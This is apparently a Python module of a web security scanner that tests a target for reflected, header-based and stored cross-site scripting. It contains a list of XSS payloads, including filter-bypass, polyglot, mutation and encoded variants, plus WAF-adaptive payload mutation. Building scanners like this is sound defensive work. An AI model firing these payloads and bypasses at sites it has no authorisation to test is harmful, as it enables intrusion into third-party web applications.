from __future__ import annotations

import asyncio

from ..core.encoding import encode_payloads
from ..core.models import Finding, Severity
from ..core.waf_detect import detect_waf, waf_adapt_payload

# Reflected XSS payloads for different contexts
PAYLOADS = [
    # HTML body context
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # Attribute context
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" onclick="alert(1)"',
    # JavaScript context
    "'-alert(1)-'",
    "';alert(1)//",
    "</script><script>alert(1)</script>",
    "'+alert(1)+'",
    "-alert(1)-",
    # URL context
    "javascript:alert(1)",
    "javascript:alert(1)//",
    "data:text/html,<script>alert(1)</script>",
    # Filter bypass
    "<ScRiPt>alert(1)</sCrIpT>",
    "<img src=x onerror=alert&#40;1&#41;>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(String.fromCharCode(49))>",
    # Polyglots
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    '"><img src=x onerror=alert(1)>',
    "'><script>alert(1)</script>",
    '"><svg/onload=alert(1)>',
    # Mutation XSS (mXSS)
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<svg><foreignObject><body onload=alert(1)>",
    # Event handlers (more)
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    # Encoding bypass
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
]

BENIGN = "rmw-baseline-check-12345"

# Common parameters to test
PARAMS = [
    "q", "search", "name", "redirect", "next", "return", "page", "id",
    "query", "keyword", "term", "text", "message", "comment", "title",
    "content", "body", "data", "value", "callback", "cb", "jsonp",
    "cbk", "handler", "cbfunc", "redirect_uri", "return_url", "next_url",
    "continue", "goto", "target", "dest", "url", "link", "href",
]


async def _probe_param(ctx, base: str, param: str) -> None:
    # Baseline with benign value
    if not ctx.can_request():
        return
    ctx.increment()
    baseline_resp = await ctx.http.get(base, params={param: BENIGN}, timeout=ctx.settings.timeout)
    baseline_body = baseline_resp.text or ""

    encoding = getattr(ctx.settings, "payload_encoding", "none")
    payloads = encode_payloads(PAYLOADS, encoding)
    if getattr(ctx.settings, "waf_adapt", False) and getattr(ctx, "waf_type", None):
        adapted = []
        for p in payloads:
            adapted.extend(waf_adapt_payload(p, ctx.waf_type))
        seen = set()
        payloads = [p for p in adapted if not (p in seen or seen.add(p))]
    for payload in payloads:
        if not ctx.can_request():
            return
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = resp.text or ""
        # Only flag if payload is reflected AND not in baseline
        if payload in body and payload not in baseline_body:
            # Determine context
            context = "HTML body"
            if '"' in payload and 'onmouseover' in payload:
                context = "attribute"
            elif 'javascript:' in payload:
                context = "URL"
            elif 'alert(1)' in payload and "'" in payload and '-' in payload:
                context = "JavaScript"
            ctx.add_finding(Finding(
                id=f"reflected-xss-{param}",
                title=f"Potential reflected XSS via '{param}' parameter",
                severity=Severity.MEDIUM,
                confidence=0.75,
                asset=f"{base}?{param}={payload}",
                module="xss",
                description=f"Payload reflected unencoded in response ({context} context).",
                remediation="Apply context-aware output encoding and CSP.",
                tags=["xss", "reflected"],
            ))
            return  # One finding per param is enough


async def _probe_header_xss(ctx, base: str) -> None:
    """Check if HTTP headers are reflected in the response (header-based XSS)."""
    marker = "rmwxss12345"
    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Accept-Language"]
    for header in headers_to_test:
        if not ctx.can_request():
            return
        ctx.increment()
        resp = await ctx.http.get(base, headers={header: marker}, timeout=ctx.settings.timeout)
        body = resp.text or ""
        if marker in body:
            ctx.add_finding(Finding(
                id=f"xss-header-{header.lower().replace('-', '_')}",
                title=f"Potential header-based XSS via '{header}'",
                severity=Severity.MEDIUM,
                confidence=0.7,
                asset=base,
                module="xss",
                description=f"The {header} header value is reflected in the response, enabling header-based XSS.",
                remediation="Sanitize and encode all HTTP header values before reflecting them.",
                tags=["xss", "header-based", "reflected"],
            ))


async def _probe_stored_xss(ctx, base: str) -> None:
    """Stored XSS: POST payload to common endpoints, then check if it appears on other pages."""
    payload = "rmwstoredxss12345"
    store_endpoints = ["/comment", "/comments", "/feedback", "/contact", "/message", "/post", "/reply"]
    check_pages = ["/", "/comments", "/posts", "/messages", "/feedback"]

    for endpoint in store_endpoints:
        if not ctx.can_request():
            return
        ctx.increment()
        resp = await ctx.http.post(
            f"{base}{endpoint}",
            data={"comment": payload, "message": payload, "text": payload, "content": payload},
            timeout=ctx.settings.timeout,
        )
        if resp.status_code not in (200, 201, 302, 303):
            continue
        # Check if payload appears on other pages
        for page in check_pages:
            if not ctx.can_request():
                return
            ctx.increment()
            check_resp = await ctx.http.get(f"{base}{page}", timeout=ctx.settings.timeout)
            body = check_resp.text or ""
            if payload in body:
                ctx.add_finding(Finding(
                    id=f"stored-xss-{endpoint.strip('/').replace('/', '-')}",
                    title=f"Potential stored XSS via {endpoint}",
                    severity=Severity.HIGH,
                    confidence=0.75,
                    asset=f"{base}{endpoint}",
                    module="xss",
                    description=f"Payload posted to {endpoint} was found reflected on {page}, suggesting stored XSS.",
                    remediation="Apply context-aware output encoding on all user-supplied content.",
                    tags=["xss", "stored"],
                ))
                return


async def run(ctx) -> None:
    base = f"https://{ctx.target}".rstrip("/")
    try:
        resp = await ctx.http.get(base, timeout=ctx.settings.timeout)
        ctx.waf_type = detect_waf(resp.headers, resp.text)
    except Exception:
        ctx.waf_type = None

    # Header-based XSS check
    await _probe_header_xss(ctx, base)

    # Stored XSS check
    await _probe_stored_xss(ctx, base)

    _completed = [0]
    async def _probe_with_progress(param):
        await _probe_param(ctx, base, param)
        _completed[0] += 1
        ctx.event_bus.emit("module_progress", {"module": "xss", "current": _completed[0], "total": len(PARAMS)})
    tasks = [_probe_with_progress(param) for param in PARAMS]
    await asyncio.gather(*tasks, return_exceptions=True)